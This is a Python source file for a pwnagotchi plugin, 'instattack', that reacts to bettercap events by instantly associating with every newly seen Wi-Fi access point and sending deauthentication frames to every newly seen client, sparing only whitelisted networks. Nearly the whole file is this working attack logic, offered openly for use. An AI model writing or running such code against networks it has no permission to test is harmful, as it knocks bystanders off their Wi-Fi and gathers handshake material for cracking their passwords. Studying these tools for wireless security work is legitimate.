import logging

import pwnagotchi.plugins as plugins

class instattack(plugins.Plugin):
    __author__ = '129890632+Sniffleupagus@users.noreply.github.com'
    __version__ = '1.0.0'
    __license__ = 'GPL3'
    __description__ = 'Pwn more aggressively. Launch immediate associate or deauth attack when bettercap spots a device.'

    def __init__(self):
        logging.debug("instattack plugin created")
        self.old_name = None

    # called before the plugin is unloaded
    def on_unload(self, ui):
        if self.old_name:
            ui.set('name', "%s " % self.old_name)
        else:
            ui.set('name', "%s>  " % ui.get('name')[:-3])
        self.old_name = None
        logging.info("instattack out.")

    # called to setup the ui elements
    def on_ui_setup(self, ui):
        self._ui = ui

    def on_ui_update(self, ui):
        if self.old_name == None:
            self.old_name = ui.get('name')
            if self.old_name:
                i = self.old_name.find('>')
                if i:
                    ui.set('name', "%s%s" % (self.old_name[:i], "!!!"))

    # called when everything is ready and the main loop is about to start
    def on_ready(self, agent):
        logging.info("instattack attack!")
        if self._ui:
            self._ui.set("status", "Be aggressive!\nBE BE AGGRESSIVE!")


    # REQUIRES: https://github.com/evilsocket/pwnagotchi/pull/1192
    #
    # PR to pass on all bettercap events to interested plugins. bettercap event
    # name is used to make an "on_" handler to plugins, like below.

    def on_bcap_wifi_ap_new(self, agent, event):
        try:
            if not agent._config['personality']['associate']:
                return

            if event['data']['hostname'] in agent._config['main']['whitelist']:
                logging.info(f"insta-associate: Excluded AP seen: {event['data']['hostname']}. Not associating.")
                return

            logging.info("insta-associate: %s (%s)" % (event['data']['hostname'], event['data']['mac']))
            agent.associate(event['data'], 0.3)

        except Exception as e:
            logging.error(repr(e))

    def on_bcap_wifi_client_new(self, agent, event):
        try:
            if not agent._config['personality']['deauth']:
                return

            if event['data']['AP']['hostname'] in agent._config['main']['whitelist']:
                logging.info(f"insta-deauth: Client found on excluded AP: {event['data']['AP']['hostname']}. Not deauthing.")
                return

            logging.info("insta-deauth: %s (%s)->'%s'(%s)(%s)" % (event['data']['AP']['hostname'], event['data']['AP']['mac'], event['data']['Client']['hostname'], event['data']['Client']['mac'], event['data']['Client']['vendor']))
            agent.deauth(event['data']['AP'], event['data']['Client'], 0.75)

        except Exception as e:
            logging.error(repr(e))
